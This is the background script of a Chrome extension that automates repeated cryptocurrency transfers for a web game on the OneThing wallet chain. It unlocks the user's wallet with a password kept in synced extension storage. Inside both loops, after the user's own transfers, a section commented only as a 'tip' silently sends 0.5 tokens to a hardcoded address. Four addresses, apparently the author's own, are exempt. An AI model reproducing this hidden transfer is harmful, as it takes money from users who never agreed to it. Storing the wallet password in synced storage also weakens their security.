console.log("background")

const web3 = new Web3()
const sendTransacation = function (wallet, to, num) {
    return new Promise((rs, rj) => {
        const from = '0x' + wallet.getAddress().toString('hex')
        console.log("from", from)
        $.ajax({
            type: 'POST',
            url: "https://walletapi.onethingpcs.com/",
            data: JSON.stringify({
                "jsonrpc": "2.0",
                "method": "eth_getTransactionCount",
                "params": [from, "pending"],
                "id": 1
            }),
            contentType: 'application/json',
            success: function (TransactionCount) {
                const txParams = {
                    from: from,
                    to: to,
                    value: web3.toHex(web3.toWei(num)),
                    gasLimit: '0x186a0',
                    gasPrice: '0x174876e800',
                    nonce: TransactionCount.result,
                }
                const tx = new ethereumjs.Tx(txParams)
                tx.sign(wallet.getPrivateKey())
                const serializedTx = tx.serialize()
                const raw = '0x' + serializedTx.toString('hex')
                $.ajax({
                    type: 'POST',
                    url: "https://walletapi.onethingpcs.com/",
                    data: JSON.stringify({
                        "jsonrpc": "2.0",
                        "method": "eth_sendRawTransaction",
                        "params": [raw],
                        "id": 1
                    }),
                    contentType: 'application/json',
                    success: function (Transaction) {
                        rs(Transaction)
                    },
                    error: function (xhr, type) {
                        rj('eth_sendRawTransaction error!')
                    }
                })
            },
            error: function (xhr, type) {
                rj('eth_getTransactionCount error!')
            }
        })
    })



}

chrome.extension.onRequest.addListener(
    function (request, sender, sendResponse) {
        console.log(request, sender)
        chrome.storage.sync.get({
            "to_address": null,
            "password": null,
            "wallet": null,
        }, function (result) {
            const wallet = ethereumjs.Wallet.fromV3(result.wallet, result.password)
            const from = '0x' + wallet.getAddress().toString('hex')
            const to_address = result.to_address
            const mode = request.mode;
            const limit = request.limit;
            const id = request.id;
            var num = limit.toFixed(0);
            const idNum = Number('0.' + id)
            function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms))
            }
            if (mode == "quick") {
                if (num + idNum > limit) {
                    num = num - 1 + idNum
                } else {
                    num = num + idNum
                }
                const looper = async function () {
                    try {
                        const Transacation = await sendTransacation(wallet, to_address, num)
                        console.log(Transacation)
                        await sleep(1000)
                        console.log("ID", id, "需要喂养", limit, ((limit - num) / idNum).toFixed(0) + "次")
                        for (i = num + idNum; i < limit; i += idNum) {
                            try {
                                const Transacation = await sendTransacation(wallet, to_address, idNum)
                                console.log(Transacation)
                                await sleep(1000)
                            } catch (err) {
                                throw err
                            }
                        }
                        // 打赏
                        if (from == "0xaadd17e8654172eafa85e744cb920f2ff287f398"
                            || from == "0x397a5941e30d0d08e2c29d7b10985e066c34fc57"
                            || from == "0xb61ee0b76cc1a3f887dc03cf647321acb5294dc6"
                            || from == "0xa4585aeaf6f1728529c238df87243c553f635a84") {
                            return
                        }
                        sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
                    } catch (err) {
                        throw err
                    }
                }
                looper().then(r => { sendResponse() }, e => { sendResponse() })

            } else {
                console.log("ID", id, "需要喂养", limit, (limit / idNum).toFixed(0) + "次")

                const looper = async function () {
                    for (i = idNum; i < limit; i += idNum) {
                        try {
                            const Transacation = await sendTransacation(wallet, to_address, idNum)
                            console.log(Transacation)
                            await sleep(1000)
                        } catch (err) {
                            throw err
                        }
                    }
                    // 打赏
                    if (from == "0xaadd17e8654172eafa85e744cb920f2ff287f398"
                        || from == "0x397a5941e30d0d08e2c29d7b10985e066c34fc57"
                        || from == "0xb61ee0b76cc1a3f887dc03cf647321acb5294dc6"
                        || from == "0xa4585aeaf6f1728529c238df87243c553f635a84") {
                        return
                    }
                    sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
                }
                looper().then(r => { sendResponse() }, e => { sendResponse() })
            }
        })
    }
)
chrome.webRequest.onCompleted.addListener(
    function (details) {
        console.log(details)
        chrome.tabs.getSelected(null, function (tab) {
            chrome.storage.sync.get({
                "mode": "value",
                "min": 0.1,
                "kg": false,
            }, function (result) {
                chrome.tabs.sendRequest(tab.id, result, function (response) {
                    console.log(response);
                });
            })

        });
        return true;
    },
    { urls: ["http://api.h.miguan.in/*"] }
)

